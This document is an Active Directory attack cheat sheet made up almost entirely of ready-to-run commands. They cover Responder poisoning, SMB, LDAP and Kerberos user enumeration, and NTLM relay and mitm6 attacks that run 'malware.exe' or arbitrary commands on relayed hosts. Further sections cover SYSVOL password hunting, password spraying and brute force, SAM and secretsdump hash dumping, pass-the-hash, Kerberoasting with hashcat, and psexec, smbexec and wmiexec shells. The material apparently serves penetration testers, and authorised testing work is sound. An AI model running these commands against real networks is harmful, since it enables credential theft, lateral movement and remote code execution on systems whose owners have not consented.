## AD Notes

#### Responder

```
responder -I eth0 -dwv
```

---

#### Scan IP range smb

```
crackmapexec smb [ip range]
```

---

#### Find netbios names

```
nbtscan [ip range]
```

---

#### Find DC server

```
nslookup -type=SRV _ldap._tcp.dc._msdcs.[domain name]
```

```
nmap --reason --open -n -Pn -T4 -sS -p53,88,389,636,464 -oA dc_servers [ip-range]
```

#### Find Domain name

```
nmap -sS -A -Pn -T4 --osscan-guess --version-all -p53,88,389,636,464 -oA domain_name [dc-ip]
```

---

#### Find smb vulns

```
nmap -PN --script smb-vuln* -p139,445 -oA smb_vulns [dc-ip]
```

---

#### Find guest/anonymous access on smb share

```
enum4linux -a -u "" -p "" [dc-ip] && enum4linux -a -u "guest" -p "" [dc-ip]
```

```
smbmap -u "" -p "" -P 445 -H [dc-ip] && smbmap -u "guest" -p "" -P 445 -H [dc-ip]
```

```
smbclient -U '%' -L //[dc-ip] && smbclient -U 'guest%' -L //[dc-ip]
```

```
crackmapexec smb [dc-ip] -u '' -p ''
```

```
crackmapexec smb [dc-ip] -u 'a' -p ''
```

---

#### Enumerate LDAP

```
nmap -n -sV --script "ldap* and not brute" -p389 -oA ldap_enum [dc-ip]
```

```
ldapsearch -x -H ldap://[dc-ip] -s base -D '' -w ''
```

---

#### Find usernames

```
enum4linux -U [dc-ip] | grep 'user:'
```

```
crackmapexec smb [dc-ip] -u '' -p '' --users
```

```
crackmapexec smb [dc-ip] -u '[username]' -p '[password]' --users
```

```
nmap -p88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='[domain name]',userdb=users.txt" -oA users_enum [dc-ip]
```

* https://github.com/ropnop/kerbrute/releases

```
./kerbrute_linux_amd64 userenum users.txt -d [domain name] --dc [dc-ip]
```

* https://github.com/ropnop/windapsearch

```
./windapsearch-linux-amd64 -d [target-ip] -m users
```

---

#### Find smb not signed (NTLM relay)

```
nmap -Pn -sS -T4 --open -p445 --script smb-security-mode -oA smb_not_signed [ip-range]
```

```
crackmapexec smb [ip-range] --gen-relay-list mytargets.txt
```

* https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py

```
responder -I eth0 -dwv

python ntlmrelayx.py -tf mytargets.txt -smb2support --http-port [port1] --smb-port [port2]

python ntlmrelayx.py -tf mytargets.txt -smb2support --http-port [port1] --smb-port [port2] -i

python ntlmrelayx.py -tf mytargets.txt -smb2support --http-port [port1] --smb-port [port2] -e malware.exe
```

---

#### Find passwords (sysvol)

```
> msfconsole
use scanner/smb/smb_enum_gpp
show options
set RHOSTS [dc servers]
set SMBDomain [domain name]
set THREADS 10
run
```

```
findstr /S /I cpassword \\DOMAIN_NAME\sysvol\DOMAIN_NAME\Policies\*.xml
```

---

#### Man in the middle

* https://github.com/dirkjanm/mitm6

```
python mitm6.py -i eth0 -d [domain name]

python ntlmrelayx.py -6 -wh [domain name] -tf mytargets.txt -smb2support  --http-port [port1] --smb-port [port2] -i

python ntlmrelayx.py -6 -wh [domain name] -tf mytargets.txt -smb2support  --http-port [port1] --smb-port [port2] -c whoami

python ntlmrelayx.py -6 -wh [domain name] -tf mytargets.txt -smb2support  --http-port [port1] --smb-port [port2] -e malware.exe
```

---

#### Password spraying

```
crackmapexec smb [target-ip] -u '[username]' -p '[password]' --pass-pol
```

```
./kerbrute_linux_amd64 passwordspray -d [domain name] --dc [dc-ip] users.txt [password]
```

* https://github.com/Greenwolf/Spray

```
./spray.sh -smb [target-ip] users.txt pass.txt 2 30 [domain name]
```

---

#### Password bruteforce

```
crackmapexec smb [target-ip] -u users.txt -p /usr/share/wordlists/fasttrack.txt
```

---

#### Pass the hash

* Get hashes with credentials

```
crackmapexec smb [target-ip] -u [username] -p [password] --sam
```

* https://github.com/fortra/impacket/blob/master/examples/secretsdump.py

```
secretsdump.py [domain name]/[username]:[password]@[target-ip]
```


```
psexec.py [username]@[target-ip] -hashes [hash]
```

---

#### Kerberoasting

* https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py

```
GetUserSPNs.py [domain name]/[username]:[password] -dc-ip [dc-ip] -request

hashcat -m 13100 hash.txt passwords.txt -O
```

---

#### Stable shells

* https://github.com/fortra/impacket/blob/master/examples/psexec.py

```
psexec.py [domain name]/[username]:[password]@[target-ip]
```

* https://github.com/fortra/impacket/blob/master/examples/smbexec.py

```
smbexec.py [domain name]/[username]:[password]@[target-ip]
```

* https://github.com/fortra/impacket/blob/master/examples/wmiexec.py

```
wmiexec.py [domain name]/[username]:[password]@[target-ip]
```

---
